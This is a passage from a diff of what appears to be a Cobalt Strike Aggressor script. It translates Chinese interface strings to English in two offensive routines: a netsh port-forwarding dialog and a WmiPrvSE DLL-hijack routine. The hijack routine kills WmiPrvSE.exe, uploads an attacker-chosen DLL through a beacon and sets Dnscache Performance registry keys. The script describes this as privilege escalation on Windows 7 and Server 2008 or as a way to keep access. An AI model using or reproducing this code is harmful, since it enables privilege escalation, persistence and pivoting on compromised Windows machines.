 	$dialog = dialog("netsh Port",%(lhost => "127.0.0.1",  rhost => "192.168.1.2", lport => "4444", rport => "4444"), &netsh_exec);
-	dialog_description($dialog, "netsh端口转发配置\nnetsh端口转发删除");
+	dialog_description($dialog, "netshPort Forwarding Configuration\nnetshPort ForwardingDelete ");
 	if ($set eq "port"){
 		drow_text($dialog, "lhost", "LHOST:");
 		drow_text($dialog, "rhost", "RHOST:");
@@ -2492,11 +2490,11 @@ sub WmiPrvSE{
 		println($data);
 	}, $callback => $data));
 	foreach $id ($bid){
-		btask($id, "WmiPrvSE DLL劫持开始配置");
+		btask($id, "WmiPrvSE DLLHijack Start configuration");
 		if(-isadmin $id){
-			btask($id, "当前为管理员权限，杀掉WmiPrvSE.exe进程");
+			btask($id, "Currently with administrator privileges, kill the WmiPrvSE.exe process");
 			bshell($id, "taskkill /F /IM WmiPrvSE.exe");
-		#	btask($id, "重新启动WmiPrvSE.exe进程");
+		#	btask($id, "Re-New Start the WmiPrvSE.exe process");
 		#	bshell($id, "WmiPrvSE.exe");
 		}
 		bupload($id, $dllname);
@@ -2509,13 +2507,11 @@ sub WmiPrvSE{
 		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Open /t REG_SZ /d OpenData /F");
 		bshell($id, "powershell -c \"Get-WmiObject -List | Where-Object {\$_.Name -Like \"\"Win32_Perf*\"\"\"\"}\"");
 	}
-	
-
 }
 
 sub WmiPrvSE_config{
 	$dialog = dialog("WmiPrvSE_config",%(uploadpath => "C:\\Windows\\Temp"), &WmiPrvSE);
-	dialog_description($dialog, "WmiPrvSE劫持\n提权适用于:Windows Server 2008\nWindows 7\n或更低版本\n或者用于做权限维持");
+	dialog_description($dialog, "WmiPrvSEHijack\nPower lifting for:Windows Server 2008\nWindows 7\nor lower\nor for doing permission maintenance");
 	drow_file($dialog, "dll", "dll:");
 	drow_text($dialog, "uploadpath", "upload_path:");
 	dbutton_action($dialog, "run");
